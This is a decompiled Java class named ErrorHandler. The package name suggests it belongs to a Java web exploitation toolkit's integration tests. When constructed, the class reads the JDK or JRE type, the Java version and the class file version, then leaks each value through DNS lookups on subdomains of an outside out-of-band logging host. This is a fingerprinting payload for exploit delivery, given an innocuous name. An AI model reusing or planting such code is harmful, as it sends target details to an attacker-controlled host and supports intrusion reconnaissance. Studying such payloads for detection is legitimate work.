package com.reajason.javaweb.integration;

import java.io.File;
import java.net.InetAddress;

/* loaded from: Hello.class */
public class ErrorHandler {
    public static String host = "peigko.ceye.io";

    public ErrorHandler() {
        String[] strArrSplit = getJdk().split("\\|");
        for (String str : new String[]{"jdkType." + strArrSplit[0], "javaVersion." + strArrSplit[1], "classFileVersion." + strArrSplit[2]}) {
            try {
                System.out.println(str + "." + host);
                InetAddress byName = InetAddress.getByName(str + "." + host);
                System.out.println(byName);
            } catch (Throwable e) {
                e.printStackTrace();
            }
        }
    }

    private String getJdk() {
        String property = System.getProperty("java.home");
        String str = File.separatorChar == '\\' ? "javac.exe" : "javac";
        return ((new File(property, new StringBuilder().append("bin").append(File.separator).append(str).toString()).exists() || new File(new File(property).getParentFile(), new StringBuilder().append("bin").append(File.separator).append(str).toString()).exists()) ? "JDK" : "JRE") + "|" + System.getProperty("java.version") + "|" + String.valueOf(Double.valueOf(Double.parseDouble(System.getProperty("java.class.version"))).intValue());
    }

    public static void main(String[] args) {
        new ErrorHandler();
    }
}